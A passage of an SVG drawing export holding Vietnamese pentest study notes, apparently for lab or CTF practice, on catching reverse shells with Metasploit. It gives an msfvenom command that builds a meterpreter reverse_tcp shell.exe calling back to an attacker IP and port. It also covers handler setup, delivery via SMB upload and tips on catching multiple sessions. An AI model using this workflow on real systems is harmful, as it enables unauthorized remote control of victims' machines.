<path d="M884.96 7722.52 L885.55 7721.67 L886.32 7721.14 L887.51 7721.21 L888.34 7721.60 L889.46 7722.92 L890.00 7723.71 L890.47 7724.44 L890.94 7726.02 L891.30 7727.48 L890.88 7731.63 L890.00 7734.27 L888.57 7736.98 L886.74 7739.75 L884.60 7742.19 L882.41 7744.17 L880.28 7745.89 L879.15 7746.62 L878.14 7747.28 L878.14 7747.28" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="907.95" y="7739.58" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="907.95" dy="0">nó sẽ làm thay đổi hash</tspan><tspan x="907.95" dy="20">của file-&gt; dễ bị phát hiện</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M223.44 7776.04 C383.12 7774.41,541.52 7774.43,752.02 7774.78 M224.47 7774.98 C371.85 7774.61,519.47 7774.30,751.21 7775.47 M750.37 7775.69 C751.19 7790.40,750.32 7802.37,750.70 7811.15 M750.58 7774.94 C752.35 7785.11,750.74 7794.59,750.44 7810.39 M751.65 7811.98 C617.81 7810.46,485.02 7810.81,224.71 7811.28 M751.24 7810.86 C574.95 7809.83,398.83 7809.90,224.56 7811.14 M223.01 7809.49 C225.87 7802.19,225.45 7789.84,222.57 7775.58 M224.13 7811.43 C224.08 7798.50,223.98 7786.52,224.98 7775.94" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="995.54" y="7504.70" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="995.54" dy="0">inject</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="204.79299991566165" y="8376.40802533219" width="840.3323557632029" height="1483.3692888689584" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="204.79299991566165" y="8376.40802533219" width="840.3323557632029" height="1483.3692888689584" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Handler là gì?</span>
      </div>
      <a href="#doc-2a6d5f4c235fdf6d6a834734125086534dd65495" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, phần này dạy cách <strong>bắt kết nối ngược</strong> từ payload đã tạo bằng <code>msfvenom</code>. Thằng bắt gọi là <strong>handler</strong> – dùng module <code>exploit/multi/handler</code>.</p>
<h3>📘 Handler là gì?</h3>
<ul>
<li>Là <strong>listener</strong> chạy trên máy mày, mở cổng (LPORT) chờ payload từ máy nạn nhân gọi về.</li>
<li>Khi payload chạy, nó kết nối tới <code>LHOST:LPORT</code> mà mày đã ghi lúc tạo payload. Handler nhận kết nối và tạo <strong>session</strong> cho mày điều khiển.</li>
</ul>
<h3>🔧 Cấu hình handler trong msfconsole:</h3>
<pre><code class="language-bash">use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST &lt;IP_của_mày&gt;
set LPORT &lt;cổng&gt;
show options
run
</code></pre>
<ul>
<li><code>set PAYLOAD</code> phải <strong>giống hệt</strong> payload đã tạo (kể cả <code>/</code> hay <code>_</code>).</li>
<li><code>set LHOST</code> và <code>set LPORT</code> phải trùng với lúc tạo payload.</li>
<li><code>show options</code> để kiểm tra trước khi chạy.</li>
</ul>
<h3>⚠️ Quy tắc vàng: Mọi thứ phải khớp</h3>
<p>Ba giá trị bắt buộc phải trùng:</p>
<ol>
<li><strong>Payload type</strong> – <code>windows/x64/meterpreter_reverse_tcp</code> (stageless) khác <code>windows/x64/meterpreter/reverse_tcp</code> (staged).</li>
<li><strong>LHOST</strong> – IP máy mày.</li>
<li><strong>LPORT</strong> – cổng nhận kết nối.</li>
</ol>
<p>Nếu sai một trong ba, payload gọi về nhưng handler không hiểu → <strong>fail im lặng</strong>, không báo lỗi.</p>
<h3>🔁 Quy trình đầy đủ (Generate → Deliver → Catch)</h3>
<p><strong>Bước 1: Tạo payload</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o shell.exe
</code></pre>
<p><strong>Bước 2: Mở handler (trong msfconsole)</strong></p>
<pre><code class="language-bash">use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.14.12
set LPORT 4444
run
</code></pre>
<p><strong>Bước 3: Đưa payload lên mục tiêu</strong> – bằng SMB upload, SSH, hoặc cách khác.
Ví dụ dùng module <code>auxiliary/admin/smb/upload_file</code> để upload <code>shell.exe</code> lên share.</p>
<p><strong>Bước 4: Thực thi payload trên mục tiêu</strong> – chạy file đó (ví dụ <code>shell.exe</code>).</p>
<p><strong>Bước 5: Bắt session</strong> – handler nhận kết nối, hiện:</p>
<pre><code>[*] Meterpreter session 1 opened (10.10.14.12:4444 -&gt; MACHINE_IP:55320)
meterpreter &gt;
</code></pre>
<p>Sau đó dùng <code>sysinfo</code> để kiểm tra.</p>
<h3>🛠️ Mẹo hữu ích:</h3>
<ul>
<li><strong>Chạy handler nền</strong>: <code>run -j</code> – handler chạy background job, mày làm việc khác được. Khi có session, dùng <code>sessions -i &lt;id&gt;</code> để vào.</li>
<li><strong>Bắt nhiều session</strong>: <code>set ExitOnSession false</code> – handler không tắt sau session đầu, bắt được nhiều máy.</li>
<li><strong>Tự động chạy script khi có session</strong>: <code>set AutoRunScript post/windows/manage/migrate</code> – tự migrate process ngay sau khi session mở.</li>
</ul>
<p>➡️ <strong>Tóm gọn:</strong> Muốn bắt reverse shell từ payload tạo tay, mày phải mở <code>exploit/multi/handler</code>, set đúng <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>, rồi <code>run</code>. Nhớ quy tắc vàng: mọi thứ phải khớp chính xác.</p>
<p>Cần sâu hơn chỗ nào thì hỏi tiếp! 😎</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<text x="96.74" y="8377.67" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="96.74" dy="0">V) Handler catching shell</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M482.76 8374.46 L482.05 8373.74 L481.39 8373.21 L480.51 8372.68 L479.56 8372.35 L478.19 8372.15 L475.53 8372.22 L472.51 8372.68 L469.13 8373.47 L465.45 8374.46 L461.72 8375.78 L457.99 8377.17 L454.25 8378.89 L450.52 8380.60 L447.02 8382.38 L443.71 8384.10 L440.80 8385.82 L438.14 8387.27 L436.00 8388.72 L435.05 8389.45 L433.28 8390.70 L432.03 8392.09 L431.20 8393.27 L430.73 8394.46 L430.61 8395.58 L430.73 8397.17 L431.44 8399.35 L431.91 8400.27 L433.04 8402.18 L434.64 8403.96 L436.30 8405.55 L438.31 8407.13 L440.56 8408.59 L443.11 8409.90 L445.90 8411.16 L448.51 8412.35 L449.93 8412.94 L454.25 8414.46 L457.34 8415.32 L460.48 8416.11 L463.62 8416.77 L466.94 8417.30 L468.65 8417.50 L472.27 8417.69 L476.00 8417.69 L479.79 8417.56 L483.47 8417.36 L487.14 8417.10 L492.06 8416.77 L495.20 8416.57 L496.68 8416.57 L499.65 8416.57 L502.61 8416.70 L505.63 8416.77 L508.71 8416.83 L512.09 8416.90 L515.35 8416.97 L518.67 8416.90 L520.33 8416.90 L523.71 8416.90 L528.74 8416.97 L532.00 8417.10 L535.08 8417.17 L538.05 8417.23 L540.89 8417.23 L543.68 8417.17 L545.04 8417.17 L547.76 8417.10 L550.37 8416.97 L553.10 8416.77 L555.71 8416.50 L559.44 8416.17 L561.75 8415.98 L562.88 8415.91 L564.77 8415.71 L567.32 8415.38 L569.75 8415.05 L572.12 8414.66 L574.43 8414.20 L576.74 8413.60 L578.99 8412.94 L580.12 8412.61 L582.25 8411.89 L584.15 8411.29 L585.69 8410.70 L586.94 8410.23 L588.06 8409.84 L589.01 8409.38 L589.90 8408.98 L590.67 8408.45 L592.21 8407.46 L593.69 8406.41 L594.82 8405.48 L595.71 8404.63 L596.42 8404.03 L597.25 8403.17 L597.78 8402.45 L598.19 8401.46 L598.19 8400.27 L597.31 8397.63 L596.71 8396.64 L595.47 8394.46 L593.16 8391.10 L591.02 8388.72 L588.59 8386.47 L585.99 8384.43 L583.14 8382.45 L579.88 8380.60 L578.28 8379.74 L574.67 8378.09 L570.94 8376.38 L566.85 8374.73 L562.22 8372.95 L557.36 8371.23 L549.42 8368.85 L543.62 8367.53 L540.54 8367.00 L533.96 8366.21 L527.02 8365.82 L519.85 8365.75 L512.56 8365.88 L504.98 8366.15 L497.51 8366.54 L490.16 8366.94 L486.67 8367.07 L479.91 8367.47 L476.65 8367.73 L476.65 8367.73" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M211.41 8422.25 L212.36 8422.58 L214.25 8422.71 L217.04 8422.91 L221.90 8423.24 L225.51 8423.43 L227.47 8423.63 L231.56 8424.10 L235.82 8424.69 L240.21 8425.42 L244.59 8426.21 L249.16 8427.00 L255.97 8428.32 L260.71 8429.05 L265.34 8429.64 L267.65 8429.97 L271.97 8430.43 L276.30 8430.96 L280.03 8431.36 L283.41 8431.62 L286.31 8431.88 L288.86 8432.22 L290.82 8432.28 L292.30 8432.41 L293.42 8432.55 L294.73 8432.67 L295.79 8432.81 L296.92 8432.94 L296.92 8432.94" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M644.12 8440.40 L642.76 8440.66 L643.71 8439.60 L646.43 8438.49 L650.05 8437.36 L654.02 8436.50 L655.97 8436.24 L662.08 8435.85 L666.11 8436.04 L670.08 8436.44 L673.75 8437.03 L675.29 8437.30 L675.29 8437.30" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M656.09 8443.57 L654.73 8443.57 L656.98 8442.38 L659.29 8441.85 L660.54 8441.52 L663.14 8441.12 L665.99 8440.79 L668.77 8440.60 L671.44 8440.33 L672.74 8440.13 L672.74 8440.13" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M681.34 8429.90 L682.22 8429.57 L684.65 8429.57 L687.56 8429.84 L690.40 8430.30 L692.95 8431.09 L695.32 8432.28 L697.93 8434.72 L698.46 8435.78 L698.88 8438.15 L698.40 8441.06 L696.86 8444.36 L694.55 8448.12 L691.53 8451.88 L688.92 8454.79 L686.49 8456.90 L684.54 8458.35 L684.54 8458.35" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M729.34 8427.99 L728.33 8427.59 L726.96 8427.99 L725.07 8429.11 L723.05 8430.56 L721.22 8432.41 L719.79 8434.66 L718.55 8438.49 L718.37 8439.74 L718.61 8442.45 L719.62 8444.75 L721.39 8446.80 L723.76 8448.32 L726.67 8449.11 L729.75 8449.24 L733.25 8448.78 L736.03 8447.79 L737.34 8447.20 L739.41 8445.48 L740.83 8441.98 L740.54 8439.27 L739.23 8436.04 L737.57 8433.27 L735.79 8431.16 L734.14 8429.57 L732.65 8428.52 L732.65 8428.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M748.30 8430.56 L748.42 8431.82 L748.18 8432.81 L747.94 8434.52 L747.53 8436.97 L747.47 8438.15 L747.23 8440.86 L746.94 8443.70 L746.88 8446.27 L746.88 8448.85 L746.88 8450.83 L746.94 8452.47 L747.05 8453.80 L747.23 8455.18 L747.23 8455.18" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M752.45 8444.36 L752.62 8443.10 L752.56 8441.98 L751.56 8441.59 L750.73 8442.25 L750.14 8443.10 L749.66 8444.16 L749.48 8445.28 L749.78 8446.40 L751.02 8448.12 L753.81 8449.64 L756.12 8450.10 L757.48 8450.10 L760.27 8449.90 L760.27 8449.90" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M794.58 8451.09 L795.17 8449.77 L796.42 8448.05 L797.96 8446.01 L799.62 8443.57 L801.22 8440.86 L802.70 8437.82 L803.29 8436.24 L804.54 8431.88 L804.89 8429.05 L804.89 8426.34 L804.54 8423.83 L804.00 8421.98 L803.35 8420.73 L802.46 8420.00 L801.51 8419.67 L800.03 8419.87 L797.48 8421.79 L795.94 8423.63 L794.82 8425.95 L794.05 8428.72 L793.57 8431.75 L793.45 8434.92 L793.57 8436.57 L794.05 8441.52 L794.34 8443.04 L794.94 8446.01 L795.53 8448.52 L796.24 8450.83 L797.31 8453.40 L797.96 8454.52 L798.55 8455.05 L799.85 8454.59 L800.39 8453.86 L801.51 8452.02 L802.58 8450.03 L803.53 8448.19 L803.94 8447.39 L804.54 8446.14 L805.01 8445.15 L805.48 8444.29 L806.49 8444.62 L806.96 8445.75 L807.91 8447.99 L808.92 8449.70 L809.51 8450.50 L810.82 8451.82 L810.82 8451.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M818.88 8445.87 L817.87 8445.42 L816.56 8445.42 L815.56 8445.68 L814.73 8446.20 L814.25 8447.06 L814.85 8448.12 L815.68 8448.52 L816.74 8448.85 L817.87 8448.91 L819.05 8448.58 L819.76 8448.05 L820.18 8447.00 L820.24 8445.81 L820.18 8444.69 L820.30 8443.43 L820.95 8442.77 L823.02 8441.52 L823.85 8441.12 L825.34 8440.60 L826.64 8440.27 L827.71 8440.07 L828.95 8440.07 L829.90 8440.33 L830.67 8440.86 L830.67 8442.05 L830.14 8443.30 L828.77 8445.15 L827.35 8447.06 L826.16 8448.91 L825.10 8450.50 L824.56 8451.69 L824.33 8452.67 L824.92 8453.60 L825.81 8453.93 L826.94 8453.99 L830.37 8453.93 L831.74 8453.80 L834.28 8453.40 L834.28 8453.40" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M836.24 8462.44 L835.53 8463.04 L835.53 8463.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M867.47 8435.12 L867.65 8433.93 L866.46 8434.52 L865.34 8436.37 L864.21 8438.35 L863.26 8440.73 L862.85 8441.85 L862.37 8444.29 L862.19 8446.67 L862.43 8448.98 L862.96 8451.29 L863.68 8453.40 L864.15 8454.99 L864.62 8456.24 L865.10 8457.36 L864.39 8456.83 L863.91 8455.84 L863.50 8454.79 L863.44 8453.73 L864.21 8450.50 L865.34 8448.39 L866.76 8446.27 L868.30 8444.56 L869.84 8442.97 L871.32 8441.79 L872.39 8440.99 L873.39 8440.46 L874.40 8440.07 L875.35 8440.40 L875.71 8441.45 L875.76 8442.64 L875.76 8443.96 L875.82 8446.47 L875.82 8447.66 L875.76 8449.50 L875.76 8450.89 L875.76 8452.47 L875.82 8453.86 L875.71 8452.74 L875.59 8451.49 L876.00 8449.50 L876.18 8448.45 L877.19 8445.55 L877.66 8444.69 L878.14 8443.96 L878.85 8443.37 L879.50 8443.90 L879.79 8444.75 L880.39 8446.60 L880.68 8447.59 L881.51 8449.37 L882.46 8451.09 L883.41 8452.28 L884.36 8453.14 L885.42 8453.80 L886.49 8454.13 L888.03 8454.13 L889.51 8453.60 L890.52 8453.14 L892.24 8451.69 L893.60 8450.03 L894.73 8448.19 L895.50 8445.48 L895.50 8444.09 L895.38 8442.84 L895.02 8441.92 L894.55 8441.19 L893.78 8440.60 L892.48 8440.60 L890.99 8441.92 L889.75 8443.96 L889.51 8445.15 L889.63 8446.40 L890.40 8448.39 L891.53 8450.03 L892.89 8451.55 L894.14 8452.74 L895.38 8453.60 L896.45 8454.13 L897.51 8454.32 L897.51 8454.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M906.05 8441.79 L906.16 8443.04 L906.11 8444.36 L906.28 8447.20 L906.40 8448.39 L906.76 8449.50 L907.05 8450.36 L908.12 8450.50 L908.83 8450.03 L909.96 8449.17 L910.55 8448.58 L911.62 8447.66 L912.51 8446.80 L913.22 8446.20 L914.05 8445.55 L915.11 8445.35 L915.88 8445.81 L916.48 8446.54 L916.83 8447.46 L916.95 8448.72 L916.24 8451.82 L915.29 8453.53 L914.64 8454.26 L914.64 8454.26" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M895.14 8424.69 L898.28 8425.28 L899.65 8425.75 L903.02 8427.13 L906.34 8428.85 L909.78 8430.96 L909.78 8430.96" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M937.87 8436.83 L938.28 8437.76 L938.76 8439.74 L939.17 8442.05 L939.35 8443.17 L939.65 8446.47 L939.82 8448.32 L939.88 8449.77 L939.88 8449.77" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M949.78 8438.15 L949.13 8437.63 L947.94 8437.76 L946.76 8438.15 L945.75 8438.75 L944.92 8439.34 L944.27 8440.27 L943.85 8441.19 L943.85 8442.38 L944.33 8443.17 L945.16 8443.76 L946.22 8444.16 L947.47 8444.36 L948.65 8444.56 L948.65 8444.56" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M955.47 8442.18 L955.71 8441.19 L955.23 8441.92 L955.23 8443.30 L955.47 8444.56 L955.71 8445.48 L956.18 8446.54 L956.18 8446.54" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M959.62 8436.37 L959.62 8436.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M965.07 8442.97 L963.71 8443.04 L961.57 8443.96 L959.85 8445.15 L959.26 8445.87 L958.19 8447.20 L957.66 8448.39 L957.42 8449.57 L957.66 8451.09 L958.02 8451.95 L959.38 8453.47 L960.21 8453.93 L961.81 8454.52 L963.23 8454.72 L964.59 8454.59 L967.14 8453.86 L968.45 8453.07 L969.81 8451.29 L970.16 8450.30 L970.22 8448.98 L970.22 8447.66 L970.16 8446.47 L970.16 8447.66 L970.70 8449.31 L971.41 8451.62 L971.82 8452.81 L972.83 8455.05 L972.83 8455.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M986.34 8460.53 L986.64 8459.21 L987.76 8456.44 L988.65 8453.93 L989.48 8451.29 L990.37 8448.72 L991.08 8446.20 L991.56 8444.23 L991.79 8442.64 L991.74 8441.12 L991.50 8440.13 L990.85 8439.60 L989.60 8439.67 L988.77 8440.13 L988.06 8440.99 L987.76 8442.05 L987.76 8443.30 L988.24 8444.95 L988.95 8447.20 L989.90 8449.31 L990.96 8451.29 L991.97 8453.20 L992.45 8454.19 L993.34 8455.84 L994.05 8457.23 L994.52 8458.35 L994.94 8459.27 L995.47 8460.40 L995.94 8461.19 L996.77 8461.92 L997.84 8461.85 L998.85 8461.45 L998.85 8461.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1006.37 8448.98 L1005.48 8449.31 L1004.65 8449.70 L1002.88 8451.42 L1001.99 8452.67 L1001.51 8453.86 L1001.45 8454.99 L1001.63 8456.04 L1002.16 8456.83 L1002.82 8457.43 L1003.59 8457.82 L1004.71 8458.35 L1005.90 8458.42 L1006.96 8458.22 L1007.74 8457.82 L1008.33 8457.23 L1008.45 8455.91 L1008.15 8454.79 L1007.91 8453.80 L1007.56 8452.81 L1007.50 8451.69 L1007.91 8450.76 L1008.68 8450.03 L1009.51 8449.64 L1010.52 8449.37 L1011.88 8449.37 L1012.83 8449.77 L1013.90 8450.83 L1014.73 8452.21 L1015.32 8453.53 L1015.74 8454.79 L1015.97 8456.04 L1016.21 8457.23 L1016.33 8458.22 L1016.68 8459.60 L1017.04 8460.59 L1017.63 8461.32 L1017.63 8461.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1003.05 8438.88 L1002.46 8438.15 L1002.82 8437.23 L1003.71 8436.44 L1005.42 8435.38 L1007.50 8434.66 L1009.28 8434.33 L1010.99 8434.33 L1013.25 8434.99 L1015.20 8436.17 L1016.98 8437.76 L1018.52 8439.74 L1019.82 8441.92 L1020.95 8444.09 L1022.02 8446.01 L1022.55 8446.87 L1023.20 8448.12 L1023.20 8448.12" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1024.45 8424.49 L1025.57 8425.02 L1026.99 8425.75 L1029.19 8426.93 L1031.62 8428.32 L1032.86 8429.05 L1032.86 8429.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M437.31 9646.58 L436.36 9646.32 L435.23 9646.52 L432.45 9647.17 L429.66 9647.90 L426.70 9648.69 L423.38 9649.62 L419.76 9650.54 L416.27 9651.33 L412.95 9652.12 L409.63 9653.12 L406.61 9654.04 L405.19 9654.43 L401.28 9655.95 L399.08 9656.94 L398.02 9657.34 L396.53 9657.93 L395.41 9658.53 L394.58 9659.06 L393.99 9660.05 L393.75 9661.23 L394.05 9662.22 L395.17 9664.40 L396.53 9666.18 L398.02 9667.83 L399.91 9669.42 L402.22 9670.80 L405.25 9672.26 L406.96 9672.92 L410.64 9674.10 L414.61 9675.23 L418.82 9676.08 L423.20 9677.01 L427.65 9677.67 L434.34 9678.92 L438.67 9679.71 L442.93 9680.57 L445.13 9680.97 L449.22 9681.83 L453.36 9682.68 L457.51 9683.41 L461.72 9684.13 L465.81 9684.80 L469.96 9685.32 L473.99 9685.79 L477.84 9686.25 L481.39 9686.51 L485.01 9686.71 L488.56 9686.91 L492.00 9687.10 L495.44 9687.30 L499.05 9687.43 L502.55 9687.57 L506.16 9687.63 L509.84 9687.70 L511.68 9687.70 L515.29 9687.83 L518.79 9687.90 L523.88 9688.03 L527.08 9688.23 L529.99 9688.36 L532.71 9688.62 L535.44 9688.82 L537.99 9689.15 L540.42 9689.42 L541.72 9689.55 L544.21 9689.88 L546.58 9690.21 L548.89 9690.54 L550.96 9690.67 L552.80 9690.80 L554.46 9691.00 L557.42 9691.00 L560.03 9690.80 L561.33 9690.73 L563.76 9690.60 L566.31 9690.27 L568.80 9689.95 L571.35 9689.55 L573.90 9689.09 L576.51 9688.62 L580.42 9687.83 L582.91 9687.24 L584.09 9687.04 L586.34 9686.51 L588.30 9686.12 L589.90 9685.79 L591.32 9685.52 L592.62 9685.26 L593.75 9684.99 L594.76 9684.86 L595.71 9684.60 L597.01 9684.40 L598.25 9684.13 L599.44 9684.00 L600.68 9683.80 L601.99 9683.67 L603.35 9683.54 L604.65 9683.34 L605.90 9683.21 L606.96 9683.01 L608.09 9682.82 L609.28 9682.55 L610.28 9682.42 L611.23 9682.16 L612.36 9682.02 L613.42 9681.76 L614.43 9681.63 L615.32 9681.30 L616.21 9680.97 L617.16 9680.64 L618.11 9680.37 L618.99 9680.11 L619.76 9679.71 L619.11 9680.24 L619.71 9679.58 L619.94 9678.66 L620.18 9677.67 L620.36 9676.48 L620.42 9675.29 L620.48 9674.17 L620.48 9672.78 L620.42 9671.59 L620.24 9670.54 L620.12 9669.15 L619.94 9668.03 L619.71 9667.04 L619.47 9665.92 L619.23 9664.66 L618.99 9663.61 L618.64 9662.42 L618.34 9661.56 L617.93 9660.64 L617.57 9659.78 L617.04 9658.99 L616.68 9658.13 L616.21 9657.34 L615.73 9656.61 L615.26 9655.82 L614.67 9654.83 L614.13 9653.97 L613.66 9653.25 L613.19 9652.46 L612.71 9651.73 L612.24 9650.94 L611.71 9650.08 L611.23 9649.35 L610.76 9648.56 L610.22 9647.83 L609.63 9647.11 L609.04 9646.52 L608.33 9645.92 L607.44 9645.46 L606.49 9645.06 L605.36 9644.73 L604.18 9644.40 L603.11 9644.27 L601.93 9644.01 L600.68 9643.94 L599.38 9643.81 L596.77 9643.61 L595.59 9643.61 L593.57 9643.55 L591.79 9643.55 L590.25 9643.61 L588.18 9643.67 L585.63 9643.94 L583.14 9644.20 L580.77 9644.40 L577.45 9644.86 L575.73 9645.19 L574.19 9645.39 L572.89 9645.59 L571.65 9645.79 L570.58 9645.92 L569.45 9645.99 L567.38 9646.52 L565.07 9646.78 L563.29 9646.97 L561.81 9647.11 L559.26 9647.44 L558.13 9647.50 L556.53 9647.70 L555.11 9647.77 L551.73 9648.10 L550.61 9648.16 L548.65 9648.30 L546.99 9648.49 L545.45 9648.63 L544.09 9648.69 L542.96 9648.82 L541.48 9648.89 L540.18 9648.96 L538.93 9648.96 L537.63 9649.02 L536.33 9649.02 L534.96 9649.02 L533.42 9648.96 L530.70 9648.96 L529.63 9648.89 L527.62 9648.82 L525.96 9648.69 L524.53 9648.63 L523.29 9648.56 L522.11 9648.43 L520.98 9648.30 L517.72 9648.03 L516.00 9647.77 L512.98 9647.50 L511.62 9647.44 L510.49 9647.37 L509.36 9647.31 L507.94 9647.17 L506.58 9647.04 L505.39 9646.97 L504.15 9646.78 L502.85 9646.65 L501.48 9646.52 L500.12 9646.32 L497.22 9646.12 L495.14 9645.79 L493.36 9645.59 L491.76 9645.46 L490.34 9645.39 L489.04 9645.19 L486.85 9645.06 L485.42 9644.86 L483.94 9644.80 L482.70 9644.73 L480.56 9644.47 L478.79 9644.34 L477.42 9644.20 L476.18 9644.01 L474.99 9643.87 L473.45 9643.67 L472.09 9643.48 L470.85 9643.22 L469.54 9643.02 L466.52 9642.42 L465.39 9642.16 L463.68 9641.76 L462.13 9641.50 L460.77 9641.23 L459.59 9640.97 L458.46 9640.77 L456.98 9640.51 L455.62 9640.37 L454.25 9640.18 L452.77 9640.11 L449.69 9640.25 L447.56 9640.25 L445.84 9640.37 L444.30 9640.44 L441.10 9640.77 L439.14 9640.97 L437.36 9641.17 L434.28 9641.76 L431.97 9642.16 L430.02 9642.56 L428.53 9642.89 L427.11 9643.22 L425.81 9643.55 L424.68 9643.81 L423.38 9644.07 L422.25 9644.40 L421.36 9644.80 L420.65 9645.46 L420.65 9645.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M445.72 9601.90 L444.95 9602.29 L443.65 9602.29 L442.40 9602.36 L441.10 9602.49 L440.09 9602.62 L438.79 9602.76 L437.60 9603.02 L436.65 9603.28 L435.71 9603.48 L434.64 9603.68 L433.57 9603.88 L432.45 9604.14 L431.26 9604.27 L430.02 9604.47 L428.77 9604.60 L427.47 9604.67 L426.22 9604.87 L424.92 9605.00 L423.68 9605.20 L422.49 9605.26 L421.31 9605.33 L420.06 9605.40 L418.88 9605.46 L417.45 9605.46 L416.09 9605.40 L414.67 9605.40 L413.31 9605.33 L412.06 9605.26 L410.76 9605.20 L409.51 9605.07 L408.15 9605.00 L406.85 9604.93 L405.42 9604.87 L404.06 9604.73 L402.70 9604.67 L401.63 9604.60 L400.15 9604.67 L398.67 9604.73 L397.54 9605.00 L396.42 9605.26 L395.29 9605.46 L394.28 9605.73 L393.33 9606.12 L392.39 9606.45 L391.50 9606.92 L390.79 9607.44 L390.08 9608.04 L389.48 9608.70 L388.95 9609.36 L388.42 9610.41 L387.88 9611.40 L387.65 9612.46 L387.53 9613.58 L387.59 9615.03 L387.65 9616.22 L388.00 9617.41 L388.48 9618.53 L388.89 9619.32 L389.42 9620.12 L390.08 9620.90 L390.79 9621.70 L391.56 9622.42 L392.39 9623.09 L393.28 9623.75 L394.22 9624.27 L395.17 9624.80 L396.12 9625.33 L397.13 9625.86 L398.19 9626.32 L399.32 9626.72 L400.33 9627.24 L401.39 9627.50 L402.34 9627.97 L403.35 9628.23 L404.30 9628.63 L405.25 9628.96 L406.25 9629.29 L407.20 9629.62 L408.09 9629.95 L409.10 9630.15 L410.05 9630.47 L411.11 9630.74 L412.12 9630.87 L413.25 9631.14 L414.37 9631.33 L415.56 9631.53 L416.68 9631.66 L417.87 9631.86 L419.11 9631.93 L420.36 9631.99 L421.60 9632.06 L422.91 9632.13 L424.15 